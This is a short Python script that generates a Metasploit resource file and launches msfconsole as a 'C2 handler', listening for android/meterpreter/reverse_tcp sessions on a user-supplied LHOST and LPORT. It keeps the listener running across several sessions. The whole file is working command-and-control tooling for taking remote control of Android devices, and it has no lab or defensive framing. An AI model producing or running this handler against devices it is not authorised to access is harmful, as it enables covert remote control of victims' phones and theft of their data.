import os

def launch_handler():
    """
    Automates the Metasploit multi-handler setup using a resource file.
    """
    print("\n" + "="*40)
    print("      METASPLOIT C2 HANDLER")
    print("="*40)

    # User Input for the connection
    lhost = input("[?] Enter LHOST (Your Local IP): ")
    lport = input("[?] Enter LPORT: ")
    
    rc_path = "config/handler.rc"

    # Commands that will be executed inside msfconsole
    rc_commands = f"""use exploit/multi/handler
set PAYLOAD android/meterpreter/reverse_tcp
set LHOST {lhost}
set LPORT {lport}
set ExitOnSession false
exploit -j
"""

    try:
        # Saving the commands to the config file
        with open(rc_path, "w") as rc_file:
            rc_file.write(rc_commands)
        
        print(f"[*] Resource script generated: {rc_path}")
        print("[*] Launching Metasploit Framework... Please wait.")
        
        # Launching msfconsole: 
        # -q (Quiet/No banner), -r (Load resource file)
        os.system(f"msfconsole -q -r {rc_path}")

    except Exception as e:
        print(f"[!] Critical Error: {e}")

if __name__ == "__main__":
    launch_handler()
